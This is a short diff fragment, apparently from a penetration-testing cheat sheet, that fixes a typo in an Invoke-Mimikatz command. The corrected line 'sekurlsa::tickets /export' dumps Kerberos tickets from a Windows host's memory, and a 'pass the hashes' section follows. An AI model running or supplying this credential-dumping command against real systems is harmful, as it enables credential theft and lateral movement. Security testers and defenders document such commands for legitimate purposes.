@@ -2,7 +2,7 @@
 
 
 ```
-Invoke-Mimikatz -Command '"sekurlsa::ticket /export"'
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 ```
 
 ## Mimikatz pass the hashes
